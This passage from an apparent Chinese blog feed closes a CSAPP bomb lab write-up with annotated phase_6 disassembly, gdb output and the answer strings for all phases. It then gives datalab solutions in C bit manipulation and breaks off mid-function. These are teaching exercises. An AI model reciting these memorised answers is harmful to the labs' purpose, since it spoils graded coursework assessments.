0x8(%rbx),%rax // </span><br><span class="line">   0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">   0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx)</span><br><span class="line">   0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt; *(B[0])&gt;=*(*B[0]+8) &lt;=&gt; B[i].val&gt;=B[i].next.val</span><br><span class="line">   0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx // rbx=*(*rbx+8)</span><br><span class="line">   0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">   0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt; // i!=1</span><br><span class="line">   0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br><span class="line">   0x00000000004011fb &lt;+263&gt;:   pop    %rbx</span><br><span class="line">   0x00000000004011fc &lt;+264&gt;:   pop    %rbp</span><br><span class="line">   0x00000000004011fd &lt;+265&gt;:   pop    %r12</span><br><span class="line">   0x00000000004011ff &lt;+267&gt;:   pop    %r13</span><br><span class="line">   0x0000000000401201 &lt;+269&gt;:   pop    %r14</span><br><span class="line">   0x0000000000401203 &lt;+271&gt;:   retq</span><br></pre></td></tr></tbody></table></figure>
<p>前面的部分很好理解，要求输入数组 <code>int a[6]</code> 内部不能有重复元素，且 <code>a[i] &lt;= 6</code>，然后再做变换 <code>a[i]=7-a[i]</code>。</p>
<p>从 + 123 开始的循环，可以看出是要根据 <code>a[i]</code> 初始化一个位于 <code>0x20</code> 的 void * 数组 B，此时还不知道 B 的每个元素指向的是什么。当 <code>a[i]&gt;1</code> 时，+130 处的循环涉及多次寻址，比较复杂，而且难以理解， 可以通过观察打表看 B 的取值。</p>
<p>首先输入 "6 5 4 3 2 1"，转换为 "1 2 3 4 5 6"，然后打印 B 的值依次为：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) print *(int **) ($sp+0x20)</span><br><span class="line">$16 = (int *) 0x6032d0 &lt;node1&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x28)</span><br><span class="line">$17 = (int *) 0x6032e0 &lt;node2&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x30)</span><br><span class="line">$18 = (int *) 0x6032f0 &lt;node3&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x38)</span><br><span class="line">$19 = (int *) 0x603300 &lt;node4&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x40)</span><br><span class="line">$20 = (int *) 0x603310 &lt;node5&gt;</span><br><span class="line">(gdb) print *(int **) ($sp+0x48)</span><br><span class="line">$21 = (int *) 0x603320 &lt;node6&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出，随着 <code>a[i]+=1</code>，<code>b[i]+=0x10</code>。而且联想到 + 130 处的循环，<code>0x8(%rdx),%rdx</code>，可以猜测到 <code>*B[i]</code> 应该是一个结构体（大小超过了 8 Bytes），且内部含有指针（可以自更新），进而可以猜测 0x6032d0 这个地址就是链表头部。猜到这一点，后面理解起来就很容易了。</p>
<p>链表节点指向的值依次为</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">(gdb) print **(int **) ($sp+0x20)</span><br><span class="line">$23 = 332</span><br><span class="line">(gdb) print **(int **) ($sp+0x28)</span><br><span class="line">$24 = 168</span><br><span class="line">(gdb) print **(int **) ($sp+0x30)</span><br><span class="line">$25 = 924</span><br><span class="line">(gdb) print **(int **) ($sp+0x38)</span><br><span class="line">$26 = 691</span><br><span class="line">(gdb) print **(int **) ($sp+0x40)</span><br><span class="line">$27 = 477</span><br><span class="line">(gdb) print **(int **) ($sp+0x48)</span><br><span class="line">$28 = 443</span><br></pre></td></tr></tbody></table></figure>
<p>注意，上面的 int 替换为 long，结果相同，说明有可能结构体里存储的是 int 并发生了对齐填充。</p>
<p>在 + 204 处的循环里，对链表进行了重排，使得 <code>B[i].next=B[i+1]</code>。+243 处判断重排后的链表需要满足 <code>B[i].val&gt;=B[i].next.val</code>，否则会爆炸。只需根据上面的节点值，调整输入的值顺序，使得重排后的链表降序排列即可。</p>
<h2 id="答案">答案</h2>
<p>分别是每个 phase 的答案，供参考，部分答案不唯一。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">0 207</span><br><span class="line">7 0</span><br><span class="line">)/.%&amp;'</span><br><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-1 实验报告: datalab</title>
    <url>/blog/2023/04/28/CSAPP-Lab-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 CSAPP datalab 的实验报告，该 lab 的目的是验证对整数 / 浮点数表示及相关操作的理解能力。该 lab 要求仅使用有限的位运算，实现各种操作。</p>
<span id="more"></span>
<p>实验内容共 13 个函数，可以分为整数和浮点数两部分：</p>
<ul>
<li>整数部分：仅允许使用移位、&amp;, |, ^ 等运算，不允许使用类型转换、循环分支等</li>
<li>浮点数部分：在整数的基础上，允许使用循环分支</li>
</ul>
<p>具体的操作限制因题而异。除了正确性之外，实验还对每个函数允许进行的操作数进行了限制，满足限制才可以得到额外 2 分性能分。</p>
<h2 id="整数">整数</h2>
<h3 id="bitxor">bitXor</h3>
<p>只使用～与 &amp; 实现异或操作。考虑简单的两个 bit a，b：</p>
<p>a^b=1 &lt;=&gt; a=1, b=0 or a=0, b=1 &lt;=&gt; a&amp;b=0 and a|b=1</p>
<p>然而 | 是不能使用的，因此可以反过来思考：</p>
<p>a|b=1 &lt;=&gt; a,b 至少有 1 个 1 &lt;=&gt; ~a&amp;~b=0</p>
<p>因此可以得到如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> ~(x &amp; y) &amp; ~(~x &amp; ~y);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="tmin">tmin</h3>
<p>返回补码下最小的数字，只有权重为负的最高位值为 1，其余位均为 0</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two's complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="istmax">isTmax</h3>
<p>判断一个数是否是补码下的最大整数。</p>
<p>Tmax 只有最高位为 0，观察可以发现<span class="math inline"> \(\sim Tmax=Tmax+1=Tmin\ne 0\)</span>，因此可以得到下面的式子。<span class="math inline">\(\ne 0\)</span> 是考虑到输入为 - 1 的情况。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two's complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> plusOne = x + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> notX = ~x;</span><br><span class="line">  <span class="keyword">return</span> !(notX + (~plusOne + <span class="number">1</span>)) &amp; !!plusOne;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="alloddbits">allOddBits</h3>
<p>判断 x 的奇数位是否均为 1。直接构造出奇数全为 1 的数<span class="math inline"> \(a\)</span>，判断 x&amp;a==a 即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> base = <span class="number">0xAA</span>;</span><br><span class="line">  <span class="keyword">int</span> half = (base &lt;&lt; <span class="number">8</span>) + base;</span><br><span class="line">  <span class="keyword">int</span> whole = (half &lt;&lt; <span class="number">16</span>) + half;</span><br><span class="line">  x = x &amp; whole;</span><br><span class="line">  <span class="keyword">return</span> !(x + (~whole + <span class="number">1</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="negate">negate</h3>
<p>取相反数。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="isasciidigit">isAsciiDigit</h3>
<p>判断 x 是否满足给定范围，根据加减后的符号位，构造两个布尔量，相与即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> con1 = !((x + (~<span class="number">0x30</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> con2 = (x + (~<span class="number">0x3a</span> + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> con1 &amp; con2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="conditional">conditional</h3>
<p>实现三目运算符。首先用！将输入转换为零一值 cond，用 cond 为 x，y 构造全 0 或全 1 的 mask。以下代码为例，x=0 时，cond=1，mask=0，结果为 z；x!=0 时，cond=0，mask=0xffffffff，结果为 y。满足三目运算符的性质。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> cond = !x;</span><br><span class="line">  <span class="keyword">int</span> mask = ~<span class="number">0</span> + cond;</span><br><span class="line">  <span class="keyword">return</span> (mask &amp; y) | (~mask &amp; z);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="islessorequal">isLessOrEqual</h3>
<p>判断 x&lt;=y 是否成立。需要考虑加法溢出的问题。解决方法是同号的情况下才相减判断大小，异号时根据符号直接判断大小。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> signx = x &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> signy = y &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> isSignDiff = signx ^ signy;</span><br><span class="line">  <span class="keyword">return</span> (isSignDiff &amp; !signy) | (!isSignDiff &amp; !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="logicalneg">logicalNeg</h3>
<p>实现非操作，可以将任意值转为 01 值。核心思想是唯一地把 0 映射到 1，其余均映射到 0。先去除 x 的符号位，使得<span class="math inline"> \(x\ge 0\)</span>，如果<span class="math inline"> \(x-1==-1\)</span>，那么<span class="math inline"> \(x=0\)</span>。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">int</span> sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> notOverflow;</span><br><span class="line">  <span class="comment">// remove sign bit</span></span><br><span class="line">  x = x &amp; ~(sign &lt;&lt; <span class="number">31</span>);</span><br><span class="line">  notOverflow = ((~<span class="number">0</span> + x) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ~sign &amp; notOverflow;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="howmanybits">howManyBits</h3>
<p>重磅！返回补码下表征 x 所需的最少位数。这是个非常复杂的问题，从最大允许 90 次操作就可以看出来。事实上，稍加思考后，就可以知道这个题的关键是找到<strong>与符号位不同的最高位</strong>，答案 + 1（编码符号位）即是答案，例如：</p>
<ul>
<li>0 的符号位为 0，1 的最高位为 0（不存在），答案为 1</li>
<li>-1 的符号位为 1，0 的最高位为 0（不存在），答案为 1</li>
<li>0x80000000 的符号位为 1，0 的最高位是 31，答案为 32</li>
</ul>
<p>首先，为了避免正负数的问题，可以通过右移 + 异或，转换为正数处理。然后如果可以使用分支或者循环，可以逐位判断，找到最高位的 1。但是不允许的情况下，该怎么办呢？</p>
<p>一种直觉的思路是把循环展开，每次移动一位：先判断当前数是否为 0，不为 0 则计数器 + 1，然后右移 1 位。重复 31 次。代码形如：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">cnt+=!!x;</span><br><span class="line">x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line"><span class="comment">// 重复31次</span></span><br></pre></td></tr></tbody></table></figure>
<p>这样需要至少 4*31 次操作，超出了 90 的限制，显然不是高效的解法。</p>
<p>细想一下，需要返回的结果实际上是一个 5 位数，从 00000 到 11111（31），最后加上符号位即可。因此，相较于低效地在原始的 32 位数字上遍历，<strong>可以逐位地判断结果的每 1 位是否为 1</strong>。从高到低地判断，以最高位 16 为例，流程如下：</p>
<ol type="1">
<li>判断 x&gt;&gt;15 是否为 0</li>
<li> 若是，将结果第 5 位置 1，<code>x&gt;&gt;=16</code></li>
<li>若否，将结果第 5 位置 0</li>
</ol>
<p>在不允许分支的情况下，如何区分两种情况？答案是前面做过的三目运算符，<code>x=(x&gt;&gt;15)==0?x:x&gt;&gt;16</code>，即可完成。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="comment">// 32 = 100000</span></span><br><span class="line">  <span class="comment">// 31 = 011111</span></span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> cond, mask;</span><br><span class="line">  <span class="keyword">int</span> ALL_ONE = ~<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// convert negative to non-negative, -1 -&gt; 0</span></span><br><span class="line">  x ^= x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// printf("after converting: %x \n", x);</span></span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">15</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 15==0?x:x&gt;&gt;16;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">16</span>));</span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">7</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">8</span>));</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 7==0?x:x&gt;&gt;8;</span></span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 3==0?x:x&gt;&gt;4;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 1==0?x:x&gt;&gt;2;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="comment">// last one</span></span><br><span class="line">  <span class="comment">// printf("last one: %x,%x\n", x, ans);</span></span><br><span class="line">  ans |= x;</span><br><span class="line">  <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="浮点数">浮点数</h2>
<h3 id="floatscale2">floatScale2</h3>
<p>将浮点数 * 2。不难，分析得到各个位的取值后，分别判断规格数、非规格数、特殊值三种情况即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> mMask = (<span class="number">1</span> &lt;&lt; <span class="number">23</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> m = uf &amp; mMask;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0xff</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0</span>)</span><br><span class="line">  {</span><br><span class="line">    m &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    frac += <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) + (frac &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="floatfloat2int">floatFloat2Int</h3>
<p>将浮点数转为 int，同样不难。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> mMask = (<span class="number">1</span> &lt;&lt; <span class="number">23</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> m = uf &amp; mMask;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span> = frac - <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0xff</span> || <span class="built_in">exp</span> &gt;= <span class="number">31</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  m += <span class="number">1</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt;= <span class="number">23</span>)</span><br><span class="line">  {</span><br><span class="line">    m &gt;&gt;= <span class="number">23</span> - <span class="built_in">exp</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    m &lt;&lt;= <span class="built_in">exp</span> - <span class="number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (sign)</span><br><span class="line">  {</span><br><span class="line">    m = ~m + <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="floatpower2">floatPower2</h3>
<p>实现求 2 的幂的功能。重点在于判断特殊情况，下溢为 0，上溢为无穷，规格数还是非规格数等。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> frac, m;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">  {</span><br><span class="line">    frac = <span class="number">0</span>;</span><br><span class="line">    m = <span 